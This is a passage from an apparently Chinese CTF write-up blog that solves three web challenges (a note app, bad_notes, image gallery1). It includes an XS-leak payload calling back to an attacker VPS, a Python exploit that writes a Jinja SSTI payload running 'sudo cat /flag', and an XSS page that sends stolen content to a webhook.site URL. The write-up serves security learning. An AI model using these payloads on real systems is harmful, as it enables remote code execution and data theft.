punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> response<span class="token operator">=</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/view/Healthcheck"</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三个路由<code>/search/:noteId</code>可以匹配爆破<code>flag</code>路径。</p><pre class="line-numbers language-js"><code class="language-js"> flag<span class="token operator">=</span><span class="token template-string"><span class="token string">`{"title":"flag","content":"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"}`</span></span><span class="token punctuation">;</span><span class="token keyword">const</span> flagid <span class="token operator">=</span> <span class="token function">generateNoteId</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flagid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/search/:noteId'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> noteId <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">;</span>  <span class="token keyword">const</span> notes<span class="token operator">=</span>glob<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">*`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>notes<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>Message<span class="token punctuation">:</span> <span class="token string">"Not found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>      fs<span class="token punctuation">.</span><span class="token function">accessSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>Message<span class="token punctuation">:</span> <span class="token string">"Note found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们肯定是要借助<code>search</code>来爆破<code>flag</code>的<code>path</code>的，但是<code>search</code>只能本地访问。而<code>bot</code>只是访问<code>http://localhost:3000/view/Healthcheck</code>。我们的目标肯定是篡改<code>Healthcheck</code>的内容从而打<code>xs-leak</code>。</p><h6 id="修改require缓存"><a href="#修改require缓存" class="headerlink" title="修改require缓存"></a>修改require缓存</h6><p>这步看不懂，后面再补吧。。</p><h6 id="SSLEAK"><a href="#SSLEAK" class="headerlink" title="SSLEAK"></a>SSLEAK</h6><p><code>bot</code>禁用<code>js</code>，但是我们可以通过<code>Object</code>绕过，通过<code>search</code>逐位爆破出<code>flag</code>。</p><pre><code>&lt;object data=&#39;http://127.0.0.1:3000/search/&#123;A-z0-9&#125;&#39;&gt;&lt;object data=&#39;http://vpsip/found/&#123;i&#125;&#39;&gt;&lt;/object&gt;&lt;/object&gt;</code></pre><h4 id="bad-notes"><a href="#bad-notes" class="headerlink" title="bad_notes"></a>bad_notes</h4><p>没来得及看，比赛的时候光看<code>image gallery</code>了。这题预期应该还是玩缓存？一眼<code>file = os.path.join(file_path,title)</code>，<code>title</code>那里可控有个任意文件上传。</p><p>通过<code>/makenote</code>传个<code>SSTI</code>覆盖<code>login.html</code>即可。</p><p>值得注意的是模版只要渲染一次就有缓存，因此打开靶机之后不要访问，直接<code>post</code>注册登陆即可。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:7000/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>user<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">}</span>proxies<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8081"</span><span class="token punctuation">}</span>files<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"/app/templates/login.html"</span><span class="token punctuation">,</span>    <span class="token string">"content"</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"{{g.pop.__globals__.__builtins__['__import__']('os').popen('sudo cat /flag').read()}}"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"register"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>user<span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>user<span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"makenote"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>files<span class="token punctuation">)</span>r<span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="image-gallery1"><a href="#image-gallery1" class="headerlink" title="image gallery1"></a>image gallery1</h4><p>这题其实不算难，但是很巧妙。坐牢了四个小时完全没思路，只能说智商不够。</p><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p><code>bot</code>题，点击<code>share</code>的话会把<code>flag sid</code>当成<code>cookie</code>。比较奇怪的是<code>bot</code>先访问了<code>/index</code>随后访问<code>index?f</code>渲染图片。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span>flag_id<span class="token punctuation">,</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    args<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>        <span class="token string">"--headless"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    executablePath<span class="token punctuation">:</span> <span class="token string">"/usr/bin/google-chrome"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                  httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            name<span class="token punctuation">:</span> <span class="token string">'sid'</span><span class="token punctuation">,</span>            value<span class="token punctuation">:</span> flag_id<span class="token punctuation">,</span>            domain<span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`http://localhost:3000/`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>      <span class="token template-string"><span class="token string">`http://localhost:3000/?f=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>      <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">5000</span> <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> visit <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路完全错了，我还在想<code>?f</code>渲染图片是不是要看<code>index.ejs</code>怎么渲染图片的，是不是能逃逸出一个属性从而打<code>XSS</code>。但实际上如果是<code>?f</code>那里能<code>XSS</code>的话<code>bot</code>就没必要访问两次了。并且<code>index.ejs</code>那里也究极安全。</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">const</span> galleryDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.gallery'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> file <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> modal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bootstrap<span class="token punctuation">.</span>Modal</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'imageModal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> modalImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'modalImage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    modalImage<span class="token punctuation">.</span>src <span class="token operator">=</span> file    modal<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">const</span> gallery <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.gallery'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gallery<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>tagName <span class="token operator">===</span> <span class="token string">'IMG'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> modal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bootstrap<span class="token punctuation">.</span>Modal</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'imageModal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> modalImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'modalImage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"modelbutton"</span><span class="token punctuation">)</span>        modalImage<span class="token punctuation">.</span>src <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src<span class="token punctuation">;</span>        btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/share'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            method<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>            headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>              <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            body<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>id <span class="token punctuation">:</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            credentials<span class="token punctuation">:</span> <span class="token string">"include"</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> modal<span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        modal<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>    <span class="token keyword">const</span> fileNames <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">'&lt;%= files %>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>fileNames<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          fileName <span class="token operator">=</span> fileNames<span class="token punctuation">[</span>i<span class="token punctuation">]</span>          <span class="token keyword">const</span> imgElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          imgElement<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token string">`/&lt;%= id %>/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>          imgElement<span class="token punctuation">.</span>alt <span class="token operator">=</span> <span class="token template-string"><span class="token string">`Image: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>          galleryDiv<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>imgElement<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种直接给对象属性赋值的操作如果能逃逸感觉得是浏览器的洞了233。</p><p>访问根路由会根据你的<code>sid</code>读文件。</p><p><code>upload</code>那里<code>sid</code>可控，可以打个任意文件上传。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span><span class="token keyword">async</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>files <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>      <span class="token keyword">const</span> uploadedFile <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">.</span>image<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>uploadedFile<span class="token punctuation">.</span>size <span class="token operator">></span> maxSizeInBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File size exceeds the limit.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">await</span> uploadedFile<span class="token punctuation">.</span><span class="token function">mv</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uploadedFile<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="index-html-XSS"><a href="#index-html-XSS" class="headerlink" title="index.html XSS"></a>index.html XSS</h5><p>题目给的附件里有个空的<code>public</code>。</p><p>并且设置了静态目录，而<code>bot</code>访问的正是根路由，所以只要写入<code>public/index.html</code>就可以在根目录实现<code>XSS</code>了。。。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>令<code>sid=../public</code>，上传个<code>index.html</code>测试。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709103008567.png" alt="1709103008567"></p><p>不过有个坑。题目设置了<code>httponly</code>，我们只能通过<code>bot</code>第二次访问<code>index.html</code>触发<code>js</code>拿第一次<code>bot</code>访问的<code>content</code>，然后再外带。如果一开始直接覆盖<code>index.html</code>那么<code>bot</code>第一次也拿不到<code>flag</code>的路径了。</p><p>而<code>bot</code>这里延迟三秒给了我们竞争的机会。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个问题是假设我们第二次能<code>xss</code>了，但是如何拿到<code>bot</code>第一次访问的内容？</p><p>通过<code>window.history.back()</code>或者<code>window.history.go(-1)</code>即可。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>第一步点击<code>share</code>，此时<code>bot</code>访问首页拿到<code>flag</code>内容。</p><p>第二步马上上传<code>public/index.html</code>即可。</p><p><strong>index.html</strong></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>opener<span class="token punctuation">)</span><span class="token punctuation">{</span>            opener<span class="token punctuation">.</span>window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span><span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">'https://webhook.site/5d88d116-b5e8-4791-82f3-610e03b61ff4'</span><span class="token punctuation">,</span>opener<span class="token punctuation">.</span>window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'/?test'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token 